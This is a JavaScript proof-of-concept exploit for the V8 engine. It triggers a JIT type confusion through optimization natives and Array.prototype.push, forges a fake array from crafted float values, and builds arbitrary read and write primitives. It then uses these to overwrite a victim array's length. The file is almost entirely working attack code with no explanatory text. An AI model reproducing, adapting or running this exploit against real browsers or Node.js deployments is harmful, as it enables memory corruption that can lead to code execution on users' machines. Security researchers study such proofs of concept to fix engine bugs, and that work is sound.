const v2 = new Array(196608);
var addrOf_LO = v2;
function assert(a5) {
    if (!a5) {
        throw "Assertion Failed";
    }
}
class C8 {
    constructor() {
        const v12 = new ArrayBuffer(8);
        this.buf = v12;
        const v15 = new DataView(this.buf);
        this.dv = v15;
        const v18 = new Uint8Array(this.buf);
        this.u8 = v18;
        const v21 = new Uint32Array(this.buf);
        this.u32 = v21;
        const v24 = new BigUint64Array(this.buf);
        this.u64 = v24;
        const v27 = new Float32Array(this.buf);
        this.f32 = v27;
        const v30 = new Float64Array(this.buf);
        this.f64 = v30;
        this.index = 0;
    }
    pair_i32_to_f64(a33, a34) {
        const t26 = this.u32;
        t26[0] = a33;
        const t28 = this.u32;
        t28[1] = a34;
        return this.f64[0];
    }
    i64tof64(a40) {
        const t33 = this.u64;
        t33[0] = a40;
        return this.f64[0];
    }
    f64toi64(a45) {
        const t38 = this?.f64;
        t38[0] = a45;
        return this?.u64?.[0];
    }
    set_i64(a50) {
        const t43 = this?.u64;
        t43[0] = a50;
    }
    set_l(a53) {
        const t47 = this?.u32;
        t47[0] = a53;
    }
    set_h(a56) {
        const t51 = this?.u32;
        t51[1] = a56;
    }
    get_i64() {
        return this?.u64?.[0];
    }
    ftoil(a62) {
        const t58 = this?.f64;
        t58[0] = a62;
        return this?.u32?.[0];
    }
    ftoih(a67) {
        const t63 = this?.f64;
        t63[0] = a67;
        return this?.u32?.[1];
    }
    mark_sweep_gc() {
        new ArrayBuffer(2145386496);
    }
    scavenge_gc() {
        for (let i77 = 0; i77 < 8; i77++) {
            let v85;
            try { v85 = new ArrayBuffer(2097152); } catch (e) {}
            try { this.add_ref(v85); } catch (e) {}
        }
        let v89;
        try { v89 = new ArrayBuffer(8); } catch (e) {}
        try { this.add_ref(v89); } catch (e) {}
    }
    trap() {
        while (1) {
        }
    }
}
const v93 = new C8();
var helper = v93;
var fake_arr_buf = null;
var fake_arr = null;
function exp() {
    function f0(a101, a102) {
        var v4 = a102[0];
        var v5 = a101[0];
        Array.prototype.push.call(a102, 4.950618252845e-311);
    }
    const v111 = %PrepareFunctionForOptimization(f0);
    const v113 = new Array(1);
    var v0 = v113;
    v0[0] = "tagged";
    f0(v0, [1]);
    const v120 = new Array(1);
    var v1 = v120;
    v1[0] = 0.1;
    const v123 = %OptimizeFunctionOnNextCall(f0);
    fake_arr_buf = [3.9490349638436e-311,2.3893674090823e-311,1.1,1.1,1.1,1.1,1.1,1.1,1.1];
    helper.mark_sweep_gc();
    f0(v1, v1);
    v1[5] = 0.1;
    fake_arr = v1[2];
}
exp();
exp();
function arbRead(a141) {
    const v143 = a141 - 8;
    let v145;
    try { v145 = helper.pair_i32_to_f64(v143, 393216); } catch (e) {}
    fake_arr_buf[1] = v145;
    const v146 = fake_arr?.[0];
    let v147;
    try { v147 = helper.f64toi64(v146); } catch (e) {}
    return v147;
}
function arbWrite(a149, a150) {
    fake_arr_buf[1] = helper.pair_i32_to_f64(a149 - 8, 393216);
    fake_arr[0] = helper.i64tof64(a150);
}
console.log("fake_arr: " + fake_arr?.length);
var victim_array = [1.1,1.2];
console.log("Now we try to modify the length of the victim array...");
console.log("Before: " + victim_array.length);
const v175 = (262525 + 1) + 12;
const v178 = BigInt("0x2333");
try { arbWrite(v175, v178); } catch (e) {}
console.log("After: " + victim_array.length);
